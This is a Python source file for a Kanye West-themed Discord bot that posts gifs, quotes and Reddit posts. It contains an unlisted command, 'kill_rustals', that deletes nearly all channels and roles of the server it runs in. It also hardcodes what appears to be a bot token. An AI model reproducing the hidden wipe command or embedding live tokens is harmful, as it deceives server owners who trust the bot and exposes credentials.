import discord
import random

from discord.ext import commands, tasks
from Embeds.Embeds import embed_help
from SRC.reddit import gather_post_info, upvotes, titles, pictures, links
from SRC.utilites import get_gif, get_random_gif, output_random_quote
from SRC.will_checker import gather_will_info
from SRC.music import play_help_embed

client = commands.Bot(command_prefix="!ye ")
client.remove_command("help")
list_of_status = ["College Dropout", "Late Registration", "Graduation", "808s & Heartbreaks", "My Dark Fantasy", "Watch The Throne", "YEEZUS", "The Life of Pablo", "YE", "Kids See Ghosts", "Jesus Is King", "Sunday Service"]
list_of_commands = [['help', "Shows list of commands"],
                    ['play {album] or {link} or {song}', "Plays the desired song/album"],
                    ['play help', "Shows help info"],
                    ['gif', "Shows random Kanye gif"],
                    ['subreddit', "Shows top 5 r/Kanye posts"],
                    ['quote', "Shows random quote"],
                    ['god', "Shows random Kanye god gif"],
                    ['kobe', "Shows legendary Kanye + Kobe video"]]


@tasks.loop(seconds=60)
async def change_status():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=list_of_status[random.randint(0, 10)]))


@client.command(pass_context=True, commands=["kill_rustals"])
async def kill_rustals(ctx):
    for channel in ctx.message.guild.channels:
        if channel == "Text Channels":
            continue
        elif channel == "Voice Channels":
            continue
        await channel.delete()
        print(str(channel) + " Deleted!")
    index = 0
    for role in ctx.message.guild.roles:
        if index == 0:
            index += 1
            continue
        print(str(role) + " Deleted!")
        await role.delete()
        index += 1


@client.command(pass_context=True)
async def leave(ctx):
    for x in client.voice_clients:
        if x.channel == ctx.author.voice.channel:
            return await x.disconnect()\


@client.command(pass_context=True)
async def will(ctx):
    await ctx.author.edit(name="wfaf")


@client.command(pass_context=True, commands=["play help"])
async def play_help(ctx):
    for x in client.voice_clients:
        if x.channel == ctx.author.voice.channel:
            return await x.disconnect()


#@client.command(pass_context=True)
# async def play(ctx, *, song=None, channel: discord.VoiceChannel = None):
#     if not channel and not ctx.author.voice:
#         await ctx.send("Your not in a voice channel!")
#     else:
#         if not song:
#             await ctx.send(embed=play_help_embed)
#         else:
#             destination = channel or ctx.author.voice.channel
#             vc = await destination.connect()
#             async with ctx.typing():
#                 try:
#                     source = await YTDLSource.create_source(ctx, search, loop=self.bot.loop)
#                 except YTDLError as e:
#                     await ctx.send('An error occurred while processing this request: {}'.format(str(e)))
#                 else:
#                     song = Song(source)
#
#                     await ctx.voice_state.songs.put(song)
#                     await ctx.send('Enqueued {}'.format(str(source)))


@client.command(pass_context=True)
async def help(ctx):
    await ctx.send(embed=embed_help(list_of_commands))


@client.command(pass_context=True)
async def gif(ctx):
    list = get_random_gif()
    for response in list['results']:
        await ctx.send(response["url"])


@client.command(pass_context=True)
async def subreddit(ctx):
    await ctx.send(f"One moment {ctx.author}")
    gather_post_info()
    index = 0
    while index < 5:
        embed = discord.Embed(color=0xff0000)
        if index == 4:
            embed.set_image(url="https://thumbs.gfycat.com/HatefulClutteredIrishwolfhound-size_restricted.gif")
        else:
            embed.set_image(url=pictures[index])
        embed.add_field(name=f"#{index + 1}  -  <:upvote:692958740865089536> {upvotes[index]} Upvotes",
                        value=f"[{titles[index]}]({links[index]})", inline=False)
        await ctx.send(embed=embed)
        index += 1


@client.command(pass_context=True)
async def quote(ctx):
    random_quote = output_random_quote()[random.randint(0, 25)]
    await ctx.send("\"" + random_quote.strip("\n") + "\"")


@client.command(pass_context=True)
async def god(ctx):
    await ctx.send("https://tenor.com/view/kanye-agod-iam-agod-kanye-west-conceited-gif-5313292")


@client.command(pass_context=True)
async def kobe(ctx):
    await ctx.send("https://youtu.be/uxgHmbM3Ig0")


@client.event
async def on_ready():
    print("The bot is ready!")
    change_status.start()


client.run('NjkyNTc2MTcxOTAwMTQxNTk4.Xn-Nlw.dRACkNS6upNqaAhIZG5ms0_gpQY')
